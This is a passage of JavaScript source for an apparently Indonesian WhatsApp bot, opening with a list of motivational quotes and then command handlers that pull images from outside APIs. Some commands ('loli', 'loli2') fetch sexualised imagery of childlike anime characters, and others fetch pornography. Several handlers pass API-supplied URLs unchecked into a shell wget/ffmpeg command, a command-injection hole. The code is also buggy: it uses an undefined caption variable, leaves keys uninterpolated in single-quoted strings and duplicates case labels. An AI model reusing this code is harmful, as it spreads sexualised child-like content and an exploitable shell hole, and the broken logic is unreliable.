menerima kelemahannya sesungguhnya baru saja menambah satu kelebihan pada dirinya','Ada saatnya dimana kekalahan rasa manis yaitu Saat anda sudah melakukan yang terbaik','Menabung itu hanya untuk mempertahankan kekayaan, untuk meningkatkannya berinvestasilah','Jika selamanya anda bermain aman, selamanya juga Anda di tempat yang sama','Lari dari masalah akan membuat masalah menjadi lebih besar, menghadapinya akan membuat anda menjadi lebih besar','Yang menyedihkan bukanlah bidikan yang meleset tapi bidikan tanpa target','Hati yang sedang panas menumpulkan logika dinginkan terlebih dahulu sebelum mengambil keputusan','bila ingin hasil yang besar jangan kerjakan hal yang mudah saja','Jangan biarkan impianmu dijajah oleh pendapat orang lain','Mulailah dengan yang kecil, Kerjakanlah dengan cara yang besar adalah dengan cara yang benar','Pengaruh perkataan orang kepada anda 100% adalah atas izin anda sendiri','Bekerjalah dengan ikhlas karena bekerja tanpa paksaan akan memberi hasil maksimal','Suka belajar, suka jualan, hidup hemat, beli aset suka, sedekah adalah 5 resep Makmur','Lebih baik menjadi raja tikus daripada ekor naga','Kerja keras dan kerja cerdas dapat memastikan keberhasilan dan sedekah dapat memudahkannya','Sakit dalam perjuangan itu hanya berlangsung sementara, namun jika anda menyerah rasa sakit itu akan terasa selamanya','Kegagalan terbesar adalah ketika tidak berani mencoba','Langkah pertama yang diperlukan untuk mendapatkan hal yang anda inginkan adalah memutuskan apa yang anda inginkan','Jangan takut menghadapi masa depan, hadapi dan perjuangkanlah','Dahulukan Allah dalam setiap langkah hidupmu maka semuanya akan ditambahkan kepadamu','Kesulitan adalah hujan terbaik untuk menunjukkan kualitas diri yang sebenarnya','Kesalahan dan kegagalan adalah guru terbaik jika kita mau jujur mengakui dan belajar darinya','Diam belum tentu menyelesaikan masalah tapi setidaknya tidak membesarkan masalah','Pemenang sejati selalu memberikan 100% upayanya, bahkan ketika tidak seorang pun melihatnya','Memaafkan orang lain bagai Menyiram air Bara dendam di hati baik untuk kesehatan kita','Jenius adalah 1 inspirasi dan 99 keringat tidak ada yang dapat menggantikan kerja keras','Disiplin memang tidak mudah tapi tanpa kedisiplinan hidup anda akan jauh lebih sulit','Orang yang berhenti belajar akan menjadi pemilik masa lalu, orang yang terus belajar akan menjadi pemilik masa depan','Hujan tidak hanya datang sendirian Ia datang bersama kesejukan, hal buruk tidak datang sendirian ia datang bersama pembelajaran','Menang atau kalah lakukanlah dengan jujur','Lihatlah tantangan sebagai ujian dan lihatlah masalah Sebagai teguran','Lihat ke atas agar terinspirasi lihat ke bawah agar bersyukur','Untuk meraih apa yang benar-benar anda inginkan fokus saja tidak cukup. Anda harus memiliki rasa lapar untuk meraihnya','90% dari kegagalan berasal dari orang-orang yang memiliki kebiasaan membuat alasan-alasan','Allah tidak membenci orang malas, tapi Allah mengizinkan orang rajin mengambil rezeki orang malas','Keajaiban itu nyata bagi mereka yang yakin berserah diri dan bekerja keras','Orang optimis dapat melihat peluang dalam masalah, orang pesimis akan melihat masalah dalam peluangKeajaiban itu nyata bagi mereka yang yakin berserah diri dan bekerja keras','Kualitas pikiran anda menentukan kualitas kehidupan anda','Bersyukur adalah cara ampuh untuk meraih energi yang dahsyat, Sudahkah anda bersyukur hari ini','Jangan mengharapkan sesuatu yang luar biasa jika anda hanya mau melakukan hal yang biasa saja','Kebahagiaan dimulai dengan ketulusan','1000 perkataan dan pengetahuan tidak berarti tanpa adanya satu tindakan yang nyata','Tangkap peluang, kerjakan, selesaikan','Ketika situasi di sekolah Anda tidak menyenangkan. Di saat itulah sebenarnya karakter anda sedang dibentuk','Seorang pemberani bukan orang yang tidak mempunyai rasa takut. Tapi orang yang mampu berjalan diatas rasa takutnya','dalam takut yang tampak adalah hambatan, dalam yakin yang tampak adalah kesempatan','Tidak ada kata gagal yang ada hanya sukses atau perlu belajar lagi sampai berhasil','Menjadi tua itu pasti menjadi dewasa itu pilihan','Kehidupan yang besar dimulai dari mimpi yang besar','Tragedi dalam kehidupan ini bukanlah yang berakhir terlalu cepat, tetapi kita menunggu terlalu lama untuk memulainya','Takut akan kegagalan seharusnya tidak menjadi alasan untuk tidak mencoba sesuatu','Hari ini adalah hari pertama dalam hidup anda. Buatlah hari ini menjadi hari yang terbaik sepanjang hidup anda dan semoga hari esok matahari bersinar dengan terang','Saya berpikir bahwa ada suatu hal yang lebih penting daripada sekedar percaya, tindakan Dunia ini penuh dengan pemimpi ,tidaklah banyak orang yang berani maju ke depan dan Mulai mengambil langkah pasti untuk mewujudkan visi mereka','Anda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Allah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Pergilah sejauh mungkin dan ketika anda tiba di sana anda akan melihat lebih jauh lagiAllah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Menangis dapat melepaskan tambahan hormon stress, itulah mengapa kita sehabis menangis merasa lebih baikPergilah sejauh mungkin dan ketika anda tiba di sana anda akan melihat lebih jauh lagiAllah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Ketika cinta itu dipertahankan kamu akan tau siapa yang lebih menghargai tentang sebuah hubungan','Dalam hidup ini banyak orang tahu apa yang harus Anggakukan, tetapi hanya sedikit yang melakukan apa yang ia ketahui. Mengetahui tidaklah cukup, Anda harus mengambil tindakan','Berilah perhatian lebih ke orang yang kamu sayangi, itu yang mereka butuhkan','Satu ons tindakan sama berharganya dengan satu ton teori','Kita mungkin terpisah sejak lama ketika tak mampu belajar untuk lebih dewasa','Sayangilah dia walau tidak sesempurna seperti yang kau inginkan','Kecantikan akan mengundang perhatian sikap santun memikat Kalbu','Mengetahui tidaklah cukup kita harus melakukannya, keinginan tak cukup hanya dengan berangan kita harus melakukannya','Kesalahan adalah bukti bahwa kamu sedang mencoba','Betapapun jauhnya air mengalir ia takkan pernah lupa hulunya','Lebih baik sendiri daripada bersama dengan orang yang salahBetapapun jauhnya air mengalir ia takkan pernah lupa hulunya','Lakukan sesuatu hari ini yang akan membuat dirimu berterima kasih di hari-hari mendatang','Waktu yang memutuskan Dengan siapa kamu akan berjumpa','Hati yang memutuskan siapa yang kamu inginkan dalam hidup ini','Dengan sikap yang akan menentukan siapa yang akan bertahan dalam hidupmu','Menjadi dewasa dan bijak diawali dengan menjadi muda dan bodoh','Lakukanlah apa yang paling kamu takutkan dalam hidupmu','Bekerjalah seolah kamu tak butuh uang, Cintailah seolah Kamu takkan Tersakiti dan menarilah seakan tak ada yang melihatmu','Jika hari ini sudah sempurna maka Apalah arti hari esok','Bintang pun tak kan bersinar tanpa kegelapan','Suatu saat aku akan menjadi tempat yang akan selalu kau rindu','Guru terbaik kamu adalah kesalahan terakhir yang kamu lakukan','Diam adalah respon terbaik untuk orang bodoh','Jangan pernah membuat keputusan yang permanen untuk perasaan yang sementara','Jika Allah yang menjadi alasan anda untuk hidup maka takkan pernah ada alasan untuk menyerah','Kegagalan ada bukan untuk ditakuti tetapi untuk dipelajari','Anda saat ini adalah hasil dari pengalaman anda','Keberuntungan adalah saat kesempatan datang, anda telah matang dengan segala persiapan','Jangan Menunggu hari yang terbaik untuk melangkah karena setiap hari sangatlah berharga','Keputusan yang baik diperoleh dari pengalaman, dan pengalaman didapat dari keputusan yang buruk','Setiap waktu yang anda lewati dengan sia-sia hanya menjauhkan anda dan semakin jauh dari kata sukses','Realitas kehidupan Anda adalah deskripsi dari jiwa dan pikiran anda','Berani mengambil keputusan maka anda telah melangkah 10 kali lebih cepat untuk sukses','Allah masih mencintai anda jika masih banyak cobaan dan tantangan hidup yang datang menghampiri anda. Allah percaya bahwa anda mampu melaluinya, maka jagalah kepercayaan itu','Ketika orang mengatakan anda sudah berubah sebenarnya itu hanya karena anda berhenti melakukan apa yang mereka ingin anda lakukan','Jangan menukar apa yang sangat anda inginkan untuk apa yang Anda ingin untuk saat ini','Orang-orang yang mengikuti keramaian biasanya tersesat di dalamnya','Orang tua saya bekerja terlalu keras untuk saya bukan supaya saya tidak hanya menjadi orang biasa tetapi menjadi orang luar biasa','Anda menghalangi impian anda ketika anda mengizinkan ketakutan Anda tumbuh lebih besar dari keyakinan anda','Sang juara percaya kepada dirinya sendiri bahkan ketika orang lain tidak percaya','Hanya mereka yang berani mengambil resiko yang jauh pasti dapat menemukan Seberapa jauh seseorang dapat pergi','Tunjukkan teman Anda, saya akan menunjukkan masa depan Anda','Beberapa orang ingin sesuatu terjadi, beberapa orang berharap itu akan terjadi, yang lain mewujudkannya jadi kenyataan','Jika anda menghabiskan waktu untuk mencoba menjadi baik dalam segala hal, Anda tidak akan pernah menjadi hebat dalam apapun','Sebuah perjalanan ribuan mil dimulai dari langkah kecil','Apa yang akan Anda kerjakan, Ketika anda tahu anda tidak mungkin gagal','Ketika kita memiliki satu sama lain, kita Memiliki segalanya','Kebesaran sebenarnya dapat ditemukan dalam hal hal kecil yang terkadang kita lewatkan','Bekerja keraslah, Bermimpilah lebih besar dan jaAnggah yang terbaik','Apa yang kita pikirkan menentukan apa yang akan terjadi pada kita. Jadi jika kita ingin mengubah hidup kita, kita perlu sedikit mengubah pikiran kita.','Seseorang yang berani membuang satu jam waktunya tidak mengetahui nilai dari kehidupan.','Saya memiliki filosofi yang sederhana: isi apa yang kosong, kosongkan apa yang terlalu penuh.','Hidup adalah cermin dan akan merefleksikan kembali kepada para pemikir mengenai apa yang mereka pikirkan.','Anda di sini hanya untuk persinggahan yang singkat. Jangan terburu, jangan khawatir. Yakinlah bahwa Anda menghirup wangi bunga sepanjang perjalanan.Hidup adalah cermin dan akan merefleksikan kembali kepada para pemikir mengenai apa yang mereka pikirkan.','Hidup adalah serangkaian perubahan yang alami dan spontan. Jangan tolak mereka karena itu hanya membuat penyesalan dan duka. Biarkan realita menjadi realita. Biarkan sesuatu mengalir dengan alami ke manapun mereka suka.','Hidup yang baik adalah hidup yang diinspirasi oleh cinta dan dipandu oleh ilmu pengetahuan.','Kenyataannya, Anda tidak tahu apa yang akan terjadi besok. Hidup adalah pengendaraan yang gila dan tidak ada yang menjaminnya.','Hidup adalah mimpi bagi mereka yang bijaksana, permainan bagi mereka yang bodoh, komedi bagi mereka yang kaya, dan tragedi bagi mereka yang miskin','Hidup itu bukan soal menemukan diri Anda sendiri, hidup itu membuat diri Anda sendiri.','Hal yang paling penting adalah menikmati hidupmu, menjadi bahagia, apapun yang terjadi.','Hidup itu sederhana, kita yang membuatnya sulit.']
					const vasi = motiv[Math.floor(Math.random() * motiv.length)]
					vass = await getBuffer(`https://i.ibb.co/346nsHC/56806462-399407660892553-4745814299438481408-o.jpg`)
					Angga.sendMessage(from, vass, image, { quoted: mek, caption: '*Motivasi*\n\n'+ cin })
					await limitAdd(sender)
					break
                case 'fotocewek':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	                                const cangti = ['https://i.ibb.co/1T1DCz7/cewek-thailand-20200325-007-non-fotografer-kly.jpg','https://i.ibb.co/FsJ6jjs/kucing2.jpg','https://i.ibb.co/vvkdS7n/kucing3.jpg','https://i.ibb.co/1QHWxts/kucing4.jpg','https://i.ibb.co/JQmRz4n/kucing5.jpg','https://i.ibb.co/tBwrFkG/kucing6.jpg','https://i.ibb.co/dp0YhYm/kucing7.jpg','https://i.ibb.co/R03smZT/kucing8.jpg','https://i.ibb.co/17tw0dp/kucing9.jpg','https://i.ibb.co/7XdGGqc/kucing10.jpg','https://i.ibb.co/XL9PZxg/kucing11.jpg','https://i.ibb.co/gyjvXWN/kucing12.jpg','https://i.ibb.co/R4gg4wH/kucing13.jpg','https://i.ibb.co/PmLYtFm/kucing14.jpg','https://i.ibb.co/XbSDh47/kucing15.jpg','https://i.ibb.co/kSXNJzt/kucing16.jpg']
                                        let cangtip = cangti[Math.floor(Math.random() * cangti.length)]
                                        Angga.sendMessage(from, cangtip, image, {quote: mek})
					await limitAdd(sender)
                                        break
                /*case 'kucing':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	                                const kucings = ['https://i.ibb.co/vvmp82w/kucing1.jpg']
                                        let kucigz = kucings[Math.floor(Math.random() * kucings.length)]
                                        Angga.sendMessage(from, kucigz, image, {quote: mek})
					await limitAdd(sender)
                                        break*/
		case 'ssweb':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('Urlnya mana kak?')
					teks = body.slice(7)
					reply(ind.wait())
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/screenshotweb?url=${teks}`)
					buffer = await getBuffer(anu.gambar)
					Angga.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
					break
		case 'loli':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                                        gatauda = body.slice(6)
					reply(ind.wait())
                                        anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomloli?apikey=${TobzKey}`, {method: 'get'})
                                        buffer = await getBuffer(anu.result)
                                        Angga.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
                                        break
		case 'waifu':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gatauda = body.slice(7)
					reply(ind.wait())
					data = await fetchJson('https://waifu.pics/api/sfw/neko')
					hasil = await getBuffer(data.url)
					Angga.sendMessage(from, hasil, image, {quoted: mek})
					await limitAdd(sender)
					break
		case 'loli2':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gatauda = body.slice(7)
					reply(ind.wait())
					data = await fetchJson('https://akaneko-api.herokuapp.com/api/loli')
					hasil = await getBuffer(data.url)
					Angga.sendMessage(from, hasil, image, {quoted: mek})
					await limitAdd(sender)
					break
		case 'hentai2':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
					if (!isNsfw) return reply(ind.nsfwoff())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gatauda = body.slice(9)
					reply(ind.wait())
					data = await fetchJson('https://akaneko-api.herokuapp.com/api/hentai')
					hasil = await getBuffer(data.url)
					Angga.sendMessage(from, hasil, image, {quoted: mek})
					await limitAdd(sender)
					break
		case 'animecry':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					await limitAdd(sender)
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson('https://tobz-api.herokuapp.com/api/cry?apikey=${TobzKey}', {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						buffer = fs.readFileSync(rano)
						Angga.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					break
		case 'animehug':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					await limitAdd(sender)
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson('https://tobz-api.herokuapp.com/api/hug?apikey=${TobzKey}', {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						buffer = fs.readFileSync(rano)
						Angga.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					break
		case 'pokemon':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=pokemon`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
				case 'freefireimg':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=freefire`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
				case 'ww2':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=ww2`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
                case 'anjing':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anjing`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break

                case 'kucing':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=kucing`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'doraemon':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=doraemon`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'hamster':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=aesthetic-hamsters`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'kelinci':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=aesthetic-rabbit`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
					case 'nangis':
				
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson('https://tobz-api.herokuapp.com/api/cry?apikey=${TobzKey}', {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						Angga.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
                case 'blowjob':
				
				if (!isNsfw) return reply(ind.nsfwoff())
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson('https://tobz-api.herokuapp.com/api/nsfwblowjob?apikey=${TobzKey}', {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						Angga.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
					case 'cium':
				
				if (!isNsfw) return reply(ind.nsfwoff())
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson('https://tobz-api.herokuapp.com/api/kiss?apikey=${TobzKey}', {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						Angga.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
					case 'peluk':
				
				if (!isNsfw) return reply(ind.nsfwoff())
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson('https://tobz-api.herokuapp.com/api/hug?apikey=${TobzKey}', {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						Angga.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
				case 'husbu':
				
				if (!isNsfw) return reply(ind.nsfwoff())
				    try {
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/husbu?apikey=${TobzKey}`)
						buffer = await getBuffer(res.image)
						Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'Ingat! Cintai husbumu'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('âŒ *ERROR* âŒ')
					}
					await limitAdd(sender)
					break
                case 'ranime':
				
				if (!isNsfw) return reply(ind.nsfwoff())
					gatauda = body.slice(8)
					reply(ind.wait())
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomanime?apikey=${TobzKey}`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					Angga.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
					break
				//anime
				case 'waifu':
				   	anu = await fetchJson(`https://arugaz.herokuapp.com/api/waifu`)
				  	buf = await getBuffer(anu.image)
				   	texs = ` *anime name* : ${anu.name} \n*deskripsi* : ${anu.desc} \n*source* : ${anu.source}`
				   	Angga.sendMessage(from, buf, image, { quoted: mek, caption: `${texs}`})
				        break
					case 'animeboy':
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime%20boy`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'animegirl':
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime%20girl`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					break

				case 'animeimg':
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					break

				case 'loli':
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=loli`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					break
	
                		case 'dewabatch':
                    			teks = body.slice(11)
                    			anu = await fetchJson(`https://arugaz.herokuapp.com/api/dewabatch?q=${teks}` , {method: 'get'})
                    			thum = await getBuffer(anu.thumb)
                    			Angga.sendMessage(from, thum, image, {quoted: mek, caption: `${anu.result}`})
                 			break
			   case 'animequotes':
				
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/quotesnime/random`, {method: 'get'})
					reply(anu.data.quote)
					await limitAdd(sender)
					break
		case 'mobil':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=cars`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'motor':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=motorcycle`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'sepeda':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=bicycle`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'bluesky':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=aesthetic-blue-sky`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'flower':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=aesthetic-flower`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'icecream':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=aesthetic%20ice%20cream`, {method: 'get'})
					reply(ind.wait())
